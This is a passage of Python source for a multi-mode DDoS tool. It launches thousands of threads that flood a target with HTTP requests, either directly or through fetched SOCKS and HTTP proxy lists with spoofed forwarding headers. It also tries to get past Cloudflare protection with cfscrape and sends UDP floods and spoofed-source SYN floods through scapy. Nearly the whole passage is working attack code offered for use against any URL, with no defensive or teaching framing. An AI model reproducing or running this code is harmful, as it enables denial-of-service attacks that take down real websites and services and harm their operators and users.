                urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        proxyget()
    else:
        print("[!] Selected No Get New List " +str(filenam2)+ " [!]")
        proxies_list()

def numthreads():
    global threads
    try:
        print("-----------------------------")
        threads = int(input("[*] Threads [2000]: "))
    except ValueError:
        threads = int(2000)
        print ("[!] Selected Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('=*= Press "Enter" to start attack: ')
    if choice6 == "":
        #webbrowser.open("https://youtu.be/9WV1EALFiN0", new=0, autoraise=True)
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[+] Admin: Save the Soul Being Captured by Evil!")
            sleep(3)
        attack()
        print()
    else:
        sys.exit()

def attack():
    global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
    x     = int(0)
    error = int(0)
    req_code = int(0)
    multiple = int(100)
    connection = "Connection: Keep-Alive\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    if choice_mode == "0":
        for x in range(threads):
            Home(x+1).start()
    elif choice_mode == "1":
        for x in range(threads):
            Proxy(x+1).start()
    elif choice_mode == "2":
        for x in range(threads):
            Socks(x+1).start()
    elif choice_mode == "3":
        if method_pass_cf == "1":
            for x in range(threads):
                JSv1(x+1).start()
        else:
            for x in range(threads):
                JSv2(x+1).start()
    elif choice_mode == "4":
        for x in range(threads):
            raw_dos(x+1).start()
    elif choice_mode == "5":
        for x in range(threads):
            udpflood()
    elif choice_mode == "6":
        for x in range(threads):
            synflood(x+1).start()

class raw_dos(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        global req_code, error
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : random.choice(useragents),
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
        if method_attack == "1":
            requests.get(url, headers=headersx)
        else:
            requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                else:
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] bit.ly/AnonyV28 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
                                requests.get(url, headers=headersx)
                            else:
                                requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                    except:
                        try:
                            pass
                        except:
                            pass
            except:
                try:
                    pass
                except:
                    pass

class Proxy(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            #request  = get_host + useragent + accept + referer + forward + content + length + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[!] bit.ly/AnonyV28 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        #req_code += 1
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    proxy = random.choice(proxies).strip().split(":")
                except:
                    pass

class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            #request  = get_host + useragent + accept + referer + content + length + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] bit.ly/AnonyV28 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] bit.ly/AnonyV28 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass

class Home(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + content + length + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] bit.ly/AnonyV28 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        req_code += 1
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass

class JSv1(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        http = urllib3.PoolManager()

    def run(self):
        global req_code, error
        http = urllib3.PoolManager()
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : user,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
        "Cookie" : cookie}
        while True:
            try:
                if method_attack == "1":
                    http.request("GET", url, headers=headersx)
                else:
                    http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    #error += 1
                except:
                    pass

class JSv2(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        scraper = cfscrape.create_scraper()

    def run(self):
        global req_code, error
        scraper = cfscrape.create_scraper()
        while True:
            try:
                if method_attack == "1":
                    soso = scraper.get(url, timeout=15)
                else:
                    soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                #req_code += 1
                try:
                    for y in range(multiple):
                        #req_code += 1
                        if method_attack == "1":
                            soso = scraper.get(url, timeout=15)
                        else:
                            soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    #error += 1
                except:
                    pass

def udpflood():
    global req_code, error
    tar = (str(host_ip),int(port))
    bytes = random._urandom(1180) #1475
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
        except:
            try:
                s.close()
                error += 1
            except:
                pass

class synflood(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)
        
            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = host_url
        
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            try:
                send(IP_Packet/TCP_Packet, verbose=0)
                req_code += 1
            except:
                try:
                    error += 1
                except:
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()

if __name__ == '__main__':
    start_url()
